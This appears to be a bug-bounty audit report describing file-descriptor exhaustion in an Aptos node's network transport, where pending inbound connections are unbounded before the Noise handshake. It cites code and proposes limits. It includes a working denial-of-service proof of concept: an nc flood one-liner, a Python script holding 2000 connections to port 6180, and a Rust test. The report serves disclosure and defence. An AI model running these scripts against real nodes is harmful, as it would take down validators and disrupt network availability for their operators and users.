# Audit Report

## Title
File Descriptor Exhaustion via Unlimited Pending Inbound Connections

## Summary
The network transport layer accepts inbound TCP connections without limiting the number of pending connection upgrades, allowing attackers to exhaust available file descriptors by rapidly opening connections that never complete the Noise handshake. This causes complete denial of service as the node cannot accept new connections or open files for other operations.

## Finding Description

The vulnerability exists in the connection acceptance flow where file descriptors are consumed before any connection limits are enforced.

**Attack Flow:**

1. The TCP transport accepts inbound connections in the listener stream [1](#0-0) 

2. Each accepted connection immediately consumes a file descriptor via `TcpListener::poll_accept()`, which returns a `TcpStream`

3. These connections are added to an unbounded `FuturesUnordered` collection for protocol upgrade processing [2](#0-1) 

4. New inbound connections are accepted without any limit check and added to pending upgrades [3](#0-2) 

5. A 30-second timeout is applied to the upgrade process [4](#0-3) 

6. The `inbound_connection_limit` check only applies to **completed** connections from unknown peers, not pending upgrades [5](#0-4) 

**The Vulnerability:**

An attacker can exploit this by:
- Opening many TCP connections rapidly to the node's listening port
- Not completing (or slowly completing) the Noise handshake
- Each connection consumes a file descriptor for up to 30 seconds before timeout
- If connections are opened faster than the timeout rate (>34 connections/second for a 1024 FD limit), file descriptors accumulate
- Eventually all available file descriptors are exhausted

**Why Existing Protections Don't Help:**

- `MAX_INBOUND_CONNECTIONS` (100): Only applies to completed, authenticated connections [6](#0-5) 
- TCP backlog (256): Only limits un-accepted connections in kernel queue [7](#0-6) 
- `TRANSPORT_TIMEOUT`: 30 seconds is sufficient for attackers to exhaust FDs if connections arrive rapidly
- Rate limiting: Only applies to bandwidth (bytes/sec), not connection acceptance rate

This breaks the "Resource Limits" invariant - the system fails to respect computational limits by allowing unbounded resource (file descriptor) consumption.

## Impact Explanation

**High Severity** per Aptos Bug Bounty criteria:

1. **Validator node slowdowns**: Once FD limit is approached, the node experiences severe degradation
2. **API crashes**: Node cannot open files for database operations, logging, or API requests
3. **Significant protocol violations**: 
   - Node cannot accept connections from other validators
   - Cannot participate in consensus if it's a validator node
   - Cannot accept state sync connections
   - Cannot serve client requests

While this could be argued as **Critical Severity** ("Total loss of liveness/network availability"), I classify it as High because:
- Attack requires sustained connection rate to maintain exhaustion
- Node can recover once attack stops and connections timeout
- Doesn't directly cause consensus safety violations or fund loss

## Likelihood Explanation

**Very High Likelihood:**

1. **Easy to Execute**: 
   - No authentication required before TCP accept
   - Simple Python/shell script can open thousands of connections
   - Example: `for i in {1..10000}; do nc -w 0 <node_ip> <port> & done`

2. **Low Attacker Requirements**:
   - No special privileges needed
   - No validator access required
   - Single attacker with modest bandwidth can execute

3. **Calculation**:
   - Default Linux ulimit: 1024 file descriptors (can be higher, but still finite)
   - Timeout: 30 seconds per connection
   - Required rate: 1024 / 30 = ~34 connections/second
   - This is trivially achievable from a single machine

4. **High Impact on Critical Infrastructure**:
   - Validator nodes are high-value targets
   - Successful attack can disrupt network operations
   - Could be used to target specific validators during consensus

## Recommendation

Implement a limit on the number of pending inbound connection upgrades:

**Solution 1: Hard Limit on Pending Connections**

Add a configurable limit on pending upgrades in `NetworkConfig`:

```rust
// In config/src/config/network_config.rs
pub const MAX_PENDING_INBOUND_CONNECTIONS: usize = 200;

pub struct NetworkConfig {
    // ... existing fields ...
    pub max_pending_inbound_connections: usize,
}
```

**Solution 2: Enforce Limit in TransportHandler**

Modify the transport handler to reject new connections when limit is reached:

```rust
// In network/framework/src/peer_manager/transport.rs
pub async fn listen(mut self) {
    let mut pending_inbound_connections = FuturesUnordered::new();
    let mut pending_outbound_connections = FuturesUnordered::new();
    let max_pending = self.config.max_pending_inbound_connections;

    loop {
        futures::select! {
            inbound_connection = self.listener.select_next_some() => {
                // Check limit before adding to pending
                if pending_inbound_connections.len() >= max_pending {
                    warn!("Rejecting inbound connection: max pending limit reached");
                    counters::connections_rejected(&self.network_context, ConnectionOrigin::Inbound).inc();
                    // Drop connection immediately
                    continue;
                }
                if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                    pending_inbound_connections.push(fut);
                }
            },
            // ... rest of select! ...
        }
    }
}
```

**Solution 3: Per-IP Rate Limiting**

Add connection rate limiting per source IP to prevent rapid connection attempts from single sources.

**Recommended Configuration:**
- `max_pending_inbound_connections`: 200-300 (2-3x the `max_inbound_connections`)
- Log rejected connections for monitoring
- Add metrics for pending connection count
- Consider implementing IP-based rate limiting as additional defense-in-depth

## Proof of Concept

**Rust Test Scenario:**

```rust
#[tokio::test]
async fn test_fd_exhaustion_via_pending_connections() {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};
    
    // Start a test node with transport listener
    let transport = TcpTransport::default();
    let listen_addr = "/ip4/127.0.0.1/tcp/0".parse().unwrap();
    let (listener, actual_addr) = transport.listen_on(listen_addr).unwrap();
    
    // Extract IP and port from actual_addr
    let (ip, port) = parse_ip_tcp(actual_addr.as_slice()).unwrap().0;
    let socket_addr = format!("{}:{}", ip, port);
    
    // Spawn listener task
    tokio::spawn(async move {
        // Process connections but don't complete handshakes
        futures::pin_mut!(listener);
        while let Some(Ok((upgrade_fut, _addr))) = listener.next().await {
            tokio::spawn(async move {
                // Keep connection alive without completing upgrade
                let _ = tokio::time::sleep(Duration::from_secs(60)).await;
            });
        }
    });
    
    // Attack: rapidly open many connections without completing handshake
    let mut handles = vec![];
    for _ in 0..2000 {
        let addr = socket_addr.clone();
        let handle = tokio::spawn(async move {
            // Open connection but don't send data
            if let Ok(stream) = TcpStream::connect(&addr).await {
                // Keep connection alive
                tokio::time::sleep(Duration::from_secs(60)).await;
                drop(stream);
            }
        });
        handles.push(handle);
        
        // Small delay between connections
        sleep(Duration::from_millis(10)).await;
    }
    
    // At this point, file descriptors are accumulating
    // Verify node cannot accept new connections
    // (In real scenario, this would exhaust FDs and cause failures)
    
    sleep(Duration::from_secs(5)).await;
    
    // Cleanup
    for handle in handles {
        handle.abort();
    }
}
```

**Python Attack Script:**

```python
import socket
import time
from multiprocessing import Process

def open_connection(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        # Keep connection open without completing handshake
        time.sleep(60)
        s.close()
    except:
        pass

def attack(host, port, num_connections):
    processes = []
    for i in range(num_connections):
        p = Process(target=open_connection, args=(host, port))
        p.start()
        processes.append(p)
        time.sleep(0.02)  # 50 connections/sec
        
        if i % 100 == 0:
            print(f"Opened {i} connections")
    
    for p in processes:
        p.join()

if __name__ == "__main__":
    # Target: Aptos node listening address
    attack("127.0.0.1", 6180, 2000)
```

**Notes:**
- The Python script demonstrates the attack vector by opening connections rapidly
- In production, default FD limits vary (1024-65536), but all are finite
- The attack is trivially parallelizable across multiple machines
- Monitor with: `lsof -p <node_pid> | wc -l` to observe FD count rising
- Node becomes unresponsive once FD limit is reached

### Citations

**File:** network/netcore/src/transport/tcp.rs (L127-127)
```rust
        let listener = socket.listen(256)?;
```

**File:** network/netcore/src/transport/tcp.rs (L316-334)
```rust
impl Stream for TcpListenerStream {
    type Item = io::Result<(future::Ready<io::Result<TcpSocket>>, NetworkAddress)>;

    fn poll_next(self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.inner.poll_accept(context) {
            Poll::Ready(Ok((socket, addr))) => {
                if let Err(e) = self.config.apply_config(&socket) {
                    return Poll::Ready(Some(Err(e)));
                }
                let dialer_addr = NetworkAddress::from(addr);
                Poll::Ready(Some(Ok((
                    future::ready(Ok(TcpSocket::new(socket))),
                    dialer_addr,
                ))))
            },
            Poll::Ready(Err(e)) => Poll::Ready(Some(Err(e))),
            Poll::Pending => Poll::Pending,
        }
    }
```

**File:** network/framework/src/peer_manager/transport.rs (L90-119)
```rust
    pub async fn listen(mut self) {
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
                },
                (upgrade, addr, peer_id, start_time, response_tx) = pending_outbound_connections.select_next_some() => {
                    self.handle_completed_outbound_upgrade(upgrade, addr, peer_id, start_time, response_tx).await;
                },
                (upgrade, addr, start_time) = pending_inbound_connections.select_next_some() => {
                    self.handle_completed_inbound_upgrade(upgrade, addr, start_time).await;
                },
                complete => break,
            }
        }
```

**File:** network/framework/src/transport/mod.rs (L40-41)
```rust
/// A timeout for the connection to open and complete all of the upgrade steps.
pub const TRANSPORT_TIMEOUT: Duration = Duration::from_secs(30);
```

**File:** network/framework/src/peer_manager/mod.rs (L352-388)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
```

**File:** config/src/config/network_config.rs (L44-44)
```rust
pub const MAX_INBOUND_CONNECTIONS: usize = 100;
```
